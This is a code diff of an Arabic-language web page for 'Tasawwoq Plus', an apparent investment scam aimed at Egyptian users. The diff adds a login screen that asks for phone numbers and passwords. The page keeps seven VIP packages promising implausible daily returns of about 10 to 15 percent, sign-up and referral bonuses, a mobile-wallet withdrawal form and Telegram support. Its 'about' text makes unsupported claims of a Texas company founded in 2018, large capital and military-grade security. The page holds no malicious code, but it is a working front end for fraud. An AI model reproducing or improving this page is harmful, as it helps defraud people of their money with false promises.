@@ -15,9 +15,9 @@
             --secondary: #10b981;
             --accent: #f59e0b;
             --bg: #0f172a;
-            --card-bg: #1e293b;
+            --card-bg: rgba(30, 41, 59, 0.88);
             --text: #f8fafc;
-            --text-muted: #94a3b8;
+            --text-muted: #cbd5e1;
         }
 
         * {
@@ -31,6 +31,83 @@
             background-color: var(--bg);
             color: var(--text);
             padding-bottom: 80px;
+        }
+
+        /* Fullscreen Image Login Overlay */
+        #loginScreen {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(15, 23, 42, 0.7), rgba(15, 23, 42, 0.85)), 
+                        url('https://images.unsplash.com/photo-1551836022-d5d88e9218df?q=80&w=1920&auto=format&fit=crop') no-repeat center center/cover;
+            z-index: 2000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 24px;
+            padding: 35px 25px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.7);
+        }
+
+        .login-card .logo-large {
+            font-size: 30px;
+            font-weight: 800;
+            color: #60a5fa;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            text-shadow: 0 2px 10px rgba(37, 99, 235, 0.5);
+        }
+
+        .login-card input {
+            width: 100%;
+            padding: 14px 18px;
+            margin: 10px 0;
+            background: rgba(15, 23, 42, 0.75);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 15px;
+            text-align: center;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        .login-card input:focus {
+            border-color: #3b82f6;
+            box-shadow: 0 0 12px rgba(59, 130, 246, 0.5);
+        }
+
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #2563eb, #1d4ed8);
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 12px;
+            box-shadow: 0 10px 20px rgba(37, 99, 235, 0.4);
+            transition: 0.2s;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 24px rgba(37, 99, 235, 0.6);
         }
 
         /* Header */
@@ -60,7 +137,7 @@
             border: 1px solid var(--primary);
             padding: 5px 12px;
             border-radius: 20px;
-            font-size: 14px;
+            font-size: 13px;
             display: flex;
             align-items: center;
             gap: 6px;
@@ -79,8 +156,6 @@
             padding: 20px;
             margin-bottom: 20px;
             box-shadow: 0 10px 20px rgba(37, 99, 235, 0.3);
-            position: relative;
-            overflow: hidden;
         }
 
         .hero-card h2 { font-size: 22px; margin-bottom: 5px; }
@@ -112,13 +187,12 @@
         }
 
         .action-btn {
-            background: var(--card-bg);
+            background: #1e293b;
             border: 1px solid #334155;
             border-radius: 12px;
             padding: 12px 5px;
             text-align: center;
             cursor: pointer;
-            transition: 0.2s;
             color: var(--text);
             text-decoration: none;
             display: flex;
@@ -151,17 +225,11 @@
         }
 
         .package-card {
-            background: var(--card-bg);
+            background: #1e293b;
             border: 1px solid #334155;
             border-radius: 16px;
             padding: 18px;
             position: relative;
-            transition: transform 0.2s;
-        }
-
-        .package-card:hover {
-            transform: translateY(-3px);
-            border-color: var(--primary);
         }
 
         .package-badge {
@@ -208,13 +276,11 @@
         }
 
         .modal-content {
-            background: var(--card-bg);
+            background: #1e293b;
             border-radius: 16px;
             padding: 20px;
             width: 100%;
             max-width: 450px;
-            max-height: 85vh;
-            overflow-y: auto;
             position: relative;
             border: 1px solid #334155;
         }
@@ -228,20 +294,10 @@
             color: var(--text-muted);
         }
 
-        input, select {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0 15px 0;
-            background: #0f172a;
-            border: 1px solid #334155;
-            border-radius: 8px;
-            color: #fff;
-        }
-
         /* Floating Support Button */
         .floating-support {
             position: fixed;
-            bottom: 75px;
+            bottom: 20px;
             left: 15px;
             background: #0088cc;
             color: #fff;
@@ -256,205 +312,216 @@
             z-index: 99;
             text-decoration: none;
         }
-
-        /* Bottom Nav */
-        .bottom-nav {
-            position: fixed;
-            bottom: 0; left: 0; width: 100%;
-            background: #1e293b;
-            border-top: 1px solid #334155;
-            display: flex;
-            justify-content: space-around;
-            padding: 10px 0;
-            z-index: 100;
-        }
-
-        .nav-item {
-            color: var(--text-muted);
-            text-decoration: none;
-            font-size: 11px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .nav-item.active {
-            color: var(--primary);
-        }
     </style>
 </head>
 <body>
 
-    <!-- Header -->
-    <header>
-        <div class="logo">
-            <i class="fa-solid fa-cart-shopping"></i>
-            <span>تسوق بلس</span>
+    <!-- 1. Fullscreen Image Login Overlay -->
+    <div id="loginScreen">
+        <div class="login-card">
+            <div class="logo-large">
+                <i class="fa-solid fa-cart-shopping"></i>
+                <span>تسوق بلس</span>
+            </div>
+            <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">الفرع الرسمي المعتمد لشركة Tasawwoq Plus</p>
+            
+            <input type="tel" id="loginPhone" placeholder="رقم الهاتف (مثال: 01012345678)">
+            <input type="password" id="loginPass" placeholder="كلمة السر">
+            
+            <button class="login-btn" onclick="handleLogin()">تسجيل الدخول / إنشاء حساب</button>
+            <p style="margin-top: 15px; font-size: 13px; color: var(--secondary); font-weight:700;">🎁 ستحصل على 50 ج.م هدية فور تسجيل الحساب</p>
         </div>
-        <div class="user-badge">
-            <i class="fa-solid fa-wallet"></i>
-            <span id="userPhoneDisplay">تسجيل الدخول</span>
-        </div>
-    </header>
+    </div>
 
-    <div class="container">
+    <!-- 2. Main Dashboard (Hidden Until Login) -->
+    <div id="mainDashboard" style="display: none;">
+        
+        <!-- Header -->
+        <header>
+            <div class="logo">
+                <i class="fa-solid fa-cart-shopping"></i>
+                <span>تسوق بلس</span>
+            </div>
+            <div class="user-badge">
+                <i class="fa-solid fa-user"></i>
+                <span id="userPhoneDisplay">010XXXXXXX</span>
+            </div>
+        </header>
 
-        <!-- Hero Card -->
-        <div class="hero-card">
-            <h2>منصة تسوق بلس الموثوقة 🚀</h2>
-            <p>الفرع الرسمي المعتمد في الشرق الأوسط ومصر</p>
-            <div class="balance-box">
-                <div>
-                    <span style="font-size: 12px; opacity: 0.8;">رصيدك الحالي</span>
-                    <div class="balance-amount"><span id="balanceDisplay">50</span> ج.م</div>
+        <div class="container">
+
+            <!-- Hero Card -->
+            <div class="hero-card">
+                <h2>أهلاً بك في تسوق بلس 🚀</h2>
+                <p>الفرع الرسمي المعتمد لشركة Tasawwoq Plus</p>
+                <div class="balance-box">
+                    <div>
+                        <span style="font-size: 12px; opacity: 0.8;">رصيدك الحالي</span>
+                        <div class="balance-amount"><span id="balanceDisplay">50</span> ج.م</div>
+                    </div>
+                    <button onclick="openModal('withdrawModal')" style="background: #fff; color: var(--primary); border:none; padding: 8px 15px; border-radius: 8px; font-weight:700; cursor:pointer;">سحب الأرباح</button>
                 </div>
-                <button onclick="openModal('withdrawModal')" style="background: #fff; color: var(--primary); border:none; padding: 8px 15px; border-radius: 8px; font-weight:700; cursor:pointer;">سحب الأرباح</button>
+            </div>
+
+            <!-- Quick Actions -->
+            <div class="quick-actions">
+                <div class="action-btn" onclick="claimDailyBonus()">
+                    <i class="fa-solid fa-gift" style="color: #f59e0b;"></i>
+                    <span>مكافأة يومية</span>
+                </div>
+                <div class="action-btn" onclick="openModal('referralModal')">
+                    <i class="fa-solid fa-users" style="color: #10b981;"></i>
+                    <span>دعوة أصدقاء</span>
+                </div>
+                <div class="action-btn" onclick="openModal('aboutModal')">
+                    <i class="fa-solid fa-shield-halved" style="color: #3b82f6;"></i>
+                    <span>عن المنصة</span>
+                </div>
+                <a href="https://t.me/tasawwoq_plus" target="_blank" class="action-btn">
+                    <i class="fa-brands fa-telegram" style="color: #0088cc;"></i>
+                    <span>خدمة العملاء</span>
+                </a>
+            </div>
+
+            <!-- Investment VIP Packages -->
+            <div class="section-title">
+                <i class="fa-solid fa-crown" style="color: var(--accent);"></i>
+                <span>باقات الاستثمار والمهام (VIP)</span>
+            </div>
+
+            <div class="packages-grid">
+                <!-- VIP 1 -->
+                <div class="package-card">
+                    <span class="package-badge">VIP 1</span>
+                    <h3>باقة المبتدئين</h3>
+                    <div class="package-price">300 <small style="font-size:14px;">ج.م</small></div>
+                    <p style="font-size:13px; color:var(--text-muted);">عائد يومي: 30 ج.م | 5 مهام يومية</p>
+                    <button class="btn-buy" onclick="buyPackage(300, 'VIP 1')">اشترك الآن</button>
+                </div>
+
+                <!-- VIP 2 -->
+                <div class="package-card">
+                    <span class="package-badge">VIP 2</span>
+                    <h3>الباقة الفضية</h3>
+                    <div class="package-price">1,000 <small style="font-size:14px;">ج.م</small></div>
+                    <p style="font-size:13px; color:var(--text-muted);">عائد يومي: 110 ج.م | 8 مهام يومية</p>
+                    <button class="btn-buy" onclick="buyPackage(1000, 'VIP 2')">اشترك الآن</button>
+                </div>
+
+                <!-- VIP 3 -->
+                <div class="package-card">
+                    <span class="package-badge">VIP 3</span>
+                    <h3>الباقة الذهبية</h3>
+                    <div class="package-price">2,500 <small style="font-size:14px;">ج.م</small></div>
+                    <p style="font-size:13px; color:var(--text-muted);">عائد يومي: 290 ج.م | 12 مهمة يومية</p>
+                    <button class="btn-buy" onclick="buyPackage(2500, 'VIP 3')">اشترك الآن</button>
+                </div>
+
+                <!-- VIP 4 -->
+                <div class="package-card">
+                    <span class="package-badge">VIP 4</span>
+                    <h3>الباقة الماسّية</h3>
+                    <div class="package-price">4,000 <small style="font-size:14px;">ج.م</small></div>
+                    <p style="font-size:13px; color:var(--text-muted);">عائد يومي: 500 ج.م | 15 مهمة يومية</p>
+                    <button class="btn-buy" onclick="buyPackage(4000, 'VIP 4')">اشترك الآن</button>
+                </div>
+
+                <!-- VIP 5 -->
+                <div class="package-card">
+                    <span class="package-badge">VIP 5</span>
+                    <h3>باقة كبار المستثمرين</h3>
+                    <div class="package-price">6,000 <small style="font-size:14px;">ج.م</small></div>
+                    <p style="font-size:13px; color:var(--text-muted);">عائد يومي: 800 ج.م | 20 مهمة يومية</p>
+                    <button class="btn-buy" onclick="buyPackage(6000, 'VIP 5')">اشترك الآن</button>
+                </div>
+
+                <!-- VIP 6 -->
+                <div class="package-card">
+                    <span class="package-badge">VIP 6</span>
+                    <h3>الباقة النخبوية</h3>
+                    <div class="package-price">9,000 <small style="font-size:14px;">ج.م</small></div>
+                    <p style="font-size:13px; color:var(--text-muted);">عائد يومي: 1,300 ج.م | 25 مهمة يومية</p>
+                    <button class="btn-buy" onclick="buyPackage(9000, 'VIP 6')">اشترك الآن</button>
+                </div>
+
+                <!-- VIP 7 -->
+                <div class="package-card">
+                    <span class="package-badge">VIP 7</span>
+                    <h3>الباقة الملكية</h3>
+                    <div class="package-price">12,000 <small style="font-size:14px;">ج.م</small></div>
+                    <p style="font-size:13px; color:var(--text-muted);">عائد يومي: 1,800 ج.م | 30 مهمة يومية</p>
+                    <button class="btn-buy" onclick="buyPackage(12000, 'VIP 7')">اشترك الآن</button>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Floating Telegram Support Button -->
+        <a href="https://t.me/tasawwoq_plus" target="_blank" class="floating-support">
+            <i class="fa-brands fa-telegram"></i>
+        </a>
+
+        <!-- Modal: About Us -->
+        <div id="aboutModal" class="modal">
+            <div class="modal-content">
+                <span class="close-btn" onclick="closeModal('aboutModal')">&times;</span>
+                <h3 style="margin-bottom: 12px; color: var(--primary);"><i class="fa-solid fa-shield-halved"></i> عن منصة تسوق بلس</h3>
+                <p style="font-size:14px; line-height: 1.7; color: var(--text-muted);">
+                    تأسست شركة <strong>Tasawwoq Plus LLC</strong> العالمية في ولاية تكساس، الولايات المتحدة الأمريكية عام <strong>2018</strong> كواحدة من أكبر المنصات المتخصصة في التسويق الإلكتروني وتقييم المنتجات برأس مال يتجاوز 10 ملايين دولار.<br><br>
+                    وفي إطار التوسع العالمي، تم إطلاق <strong>فرع مصر والشرق الأوسط</strong> لتقديم أسهل وأرقى أنظمة العمل الذاتي والاستثماري السريع.<br><br>
+                    🔒 **الأمان والضمان:** تتميز منصتنا بتشفير بيانات من الدرجة العسكرية وضمان كلي لعمليات السحب والإيداع السريعة عبر المحافظ الإلكترونية.
+                </p>
             </div>
         </div>
 
-        <!-- Quick Actions -->
-        <div class="quick-actions">
-            <div class="action-btn" onclick="claimDailyBonus()">
-                <i class="fa-solid fa-gift" style="color: #f59e0b;"></i>
-                <span>مكافأة يومية</span>
-            </div>
-            <div class="action-btn" onclick="openModal('referralModal')">
-                <i class="fa-solid fa-users" style="color: #10b981;"></i>
-                <span>دعوة أصدقاء</span>
-            </div>
-            <div class="action-btn" onclick="openModal('aboutModal')">
-                <i class="fa-solid fa-shield-halved" style="color: #3b82f6;"></i>
-                <span>عن المنصة</span>
-            </div>
-            <a href="https://t.me/tasawwoq_plus" target="_blank" class="action-btn">
-                <i class="fa-brands fa-telegram" style="color: #0088cc;"></i>
-                <span>خدمة العملاء</span>
-            </a>
-        </div>
-
-        <!-- Investment VIP Packages -->
-        <div class="section-title">
-            <i class="fa-solid fa-crown" style="color: var(--accent);"></i>
-            <span>باقات الاستثمار والمهام (VIP)</span>
-        </div>
-
-        <div class="packages-grid">
-            <!-- VIP 1 -->
-            <div class="package-card">
-                <span class="package-badge">VIP 1</span>
-                <h3>باقة المبتدئين</h3>
-                <div class="package-price">300 <small style="font-size:14px;">ج.م</small></div>
-                <p style="font-size:13px; color:var(--text-muted);">عائد يومي: 30 ج.م | 5 مهام يومية</p>
-                <button class="btn-buy" onclick="buyPackage(300, 'VIP 1')">اشترك الآن</button>
-            </div>
-
-            <!-- VIP 2 -->
-            <div class="package-card">
-                <span class="package-badge">VIP 2</span>
-                <h3>الباقة الفضية</h3>
-                <div class="package-price">1,000 <small style="font-size:14px;">ج.م</small></div>
-                <p style="font-size:13px; color:var(--text-muted);">عائد يومي: 110 ج.م | 8 مهام يومية</p>
-                <button class="btn-buy" onclick="buyPackage(1000, 'VIP 2')">اشترك الآن</button>
-            </div>
-
-            <!-- VIP 3 -->
-            <div class="package-card">
-                <span class="package-badge">VIP 3</span>
-                <h3>الباقة الذهبية</h3>
-                <div class="package-price">2,500 <small style="font-size:14px;">ج.م</small></div>
-                <p style="font-size:13px; color:var(--text-muted);">عائد يومي: 290 ج.م | 12 مهمة يومية</p>
-                <button class="btn-buy" onclick="buyPackage(2500, 'VIP 3')">اشترك الآن</button>
-            </div>
-
-            <!-- VIP 4 -->
-            <div class="package-card">
-                <span class="package-badge">VIP 4</span>
-                <h3>الباقة الماسّية</h3>
-                <div class="package-price">4,000 <small style="font-size:14px;">ج.م</small></div>
-                <p style="font-size:13px; color:var(--text-muted);">عائد يومي: 500 ج.م | 15 مهمة يومية</p>
-                <button class="btn-buy" onclick="buyPackage(4000, 'VIP 4')">اشترك الآن</button>
-            </div>
-
-            <!-- VIP 5 -->
-            <div class="package-card">
-                <span class="package-badge">VIP 5</span>
-                <h3>باقة كبار المستثمرين</h3>
-                <div class="package-price">6,000 <small style="font-size:14px;">ج.م</small></div>
-                <p style="font-size:13px; color:var(--text-muted);">عائد يومي: 800 ج.م | 20 مهمة يومية</p>
-                <button class="btn-buy" onclick="buyPackage(6000, 'VIP 5')">اشترك الآن</button>
-            </div>
-
-            <!-- VIP 6 -->
-            <div class="package-card">
-                <span class="package-badge">VIP 6</span>
-                <h3>الباقة النخبوية</h3>
-                <div class="package-price">9,000 <small style="font-size:14px;">ج.م</small></div>
-                <p style="font-size:13px; color:var(--text-muted);">عائد يومي: 1,300 ج.م | 25 مهمة يومية</p>
-                <button class="btn-buy" onclick="buyPackage(9000, 'VIP 6')">اشترك الآن</button>
-            </div>
-
-            <!-- VIP 7 -->
-            <div class="package-card">
-                <span class="package-badge">VIP 7</span>
-                <h3>الباقة الملكية</h3>
-                <div class="package-price">12,000 <small style="font-size:14px;">ج.م</small></div>
-                <p style="font-size:13px; color:var(--text-muted);">عائد يومي: 1,800 ج.م | 30 مهمة يومية</p>
-                <button class="btn-buy" onclick="buyPackage(12000, 'VIP 7')">اشترك الآن</button>
+        <!-- Modal: Withdraw Request -->
+        <div id="withdrawModal" class="modal">
+            <div class="modal-content">
+                <span class="close-btn" onclick="closeModal('withdrawModal')">&times;</span>
+                <h3><i class="fa-solid fa-money-bill-transfer"></i> طلب سحب الأرباح</h3>
+                <br>
+                <label>رقم محفظة فودافون كاش / أورنج / اتصالات:</label>
+                <input type="text" id="withdrawPhone" placeholder="010XXXXXXXX" style="width:100%; padding:10px; margin:10px 0; background:#0f172a; border:1px solid #334155; color:#fff; border-radius:8px;">
+                
+                <label>المبلغ المراد سحبه (ج.م):</label>
+                <input type="number" id="withdrawAmount" placeholder="الحد الأدنى 100 ج.م" style="width:100%; padding:10px; margin:10px 0; background:#0f172a; border:1px solid #334155; color:#fff; border-radius:8px;">
+                
+                <button class="btn-buy" onclick="processWithdraw()">تأكيد طلب السحب</button>
             </div>
         </div>
 
-    </div>
-
-    <!-- Floating Telegram Support Button -->
-    <a href="https://t.me/tasawwoq_plus" target="_blank" class="floating-support">
-        <i class="fa-brands fa-telegram"></i>
-    </a>
-
-    <!-- Modal: About Us -->
-    <div id="aboutModal" class="modal">
-        <div class="modal-content">
-            <span class="close-btn" onclick="closeModal('aboutModal')">&times;</span>
-            <h3 style="margin-bottom: 12px; color: var(--primary);"><i class="fa-solid fa-shield-halved"></i> عن منصة تسوق بلس</h3>
-            <p style="font-size:14px; line-height: 1.7; color: var(--text-muted);">
-                تأسست شركة <strong>Tasawwoq Plus LLC</strong> العالمية في ولاية تكساس، الولايات المتحدة الأمريكية عام <strong>2018</strong> كواحدة من أكبر المنصات المتخصصة في التسويق الإكتروني وتقييم المنتجات برأس مال يتجاوز 10 ملايين دولار.<br><br>
-                وفي إطار التوسع العالمي، تم إطلاق <strong>فرع مصر والشرق الأوسط</strong> لتقديم أسهل وأرقى وأفضل أنظمة العمل الذاتي والاستثماري السريع.<br><br>
-                🔒 **الأمان والضمان:** تتميز منصتنا بتشفير بيانات من الدرجة العسكرية وضمان كلي لعمليات السحب والإيداع السريعة عبر المحافظ الإلكترونية.
-            </p>
+        <!-- Modal: Referral -->
+        <div id="referralModal" class="modal">
+            <div class="modal-content">
+                <span class="close-btn" onclick="closeModal('referralModal')">&times;</span>
+                <h3><i class="fa-solid fa-user-plus"></i> نظام الإحالة ودعوة الأصدقاء</h3>
+                <br>
+                <p style="font-size:14px; color:var(--text-muted); margin-bottom:10px;">احصل على 10 ج.م مكافأة فورية عن كل صديق يسجل من خلال رابطك!</p>
+                <input type="text" id="referralLink" readonly value="https://ismael172000a-hub.github.io/tasawwoq-plus/?ref=user" style="width:100%; padding:10px; margin:10px 0; background:#0f172a; border:1px solid #334155; color:#fff; border-radius:8px;">
+                <button class="btn-buy" onclick="copyReferralLink()">نسخ رابط الدعوة</button>
+            </div>
         </div>
-    </div>
 
-    <!-- Modal: Withdraw Request -->
-    <div id="withdrawModal" class="modal">
-        <div class="modal-content">
-            <span class="close-btn" onclick="closeModal('withdrawModal')">&times;</span>
-            <h3><i class="fa-solid fa-money-bill-transfer"></i> طلب سحب الأرباح</h3>
-            <br>
-            <label>رقم محفظة فودافون كاش / أورنج / اتصالات:</label>
-            <input type="text" id="withdrawPhone" placeholder="010XXXXXXXX">
-            
-            <label>المبلغ المراد سحبه (ج.م):</label>
-            <input type="number" id="withdrawAmount" placeholder="الحد الأدنى 100 ج.م">
-            
-            <button class="btn-buy" onclick="processWithdraw()">تأكيد طلب السحب</button>
-        </div>
-    </div>
-
-    <!-- Modal: Referral -->
-    <div id="referralModal" class="modal">
-        <div class="modal-content">
-            <span class="close-btn" onclick="closeModal('referralModal')">&times;</span>
-            <h3><i class="fa-solid fa-user-plus"></i> نظام الإحالة ودعوة الأصدقاء</h3>
-            <br>
-            <p style="font-size:14px; color:var(--text-muted); margin-bottom:10px;">احصل على 10 ج.م مكافأة فورية عن كل صديق يسجل من خلال رابطك!</p>
-            <input type="text" id="referralLink" readonly value="https://ismael172000a-hub.github.io/tasawwoq-plus/?ref=user">
-            <button class="btn-buy" onclick="copyReferralLink()">نسخ رابط الدعوة</button>
-        </div>
     </div>
 
     <!-- Script -->
     <script>
         let currentBalance = 50;
+
+        function handleLogin() {
+            const phone = document.getElementById('loginPhone').value.trim();
+            const pass = document.getElementById('loginPass').value.trim();
+
+            if (!phone || !pass) {
+                alert('يرجى إدخال رقم الهاتف وكلمة السر لدخول المنصة');
+                return;
+            }
+
+            // Hide Login Screen & Show Main Dashboard
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('mainDashboard').style.display = 'block';
+            document.getElementById('userPhoneDisplay').innerText = phone;
+        }
 
         function openModal(id) {
             document.getElementById(id).style.display = 'flex';
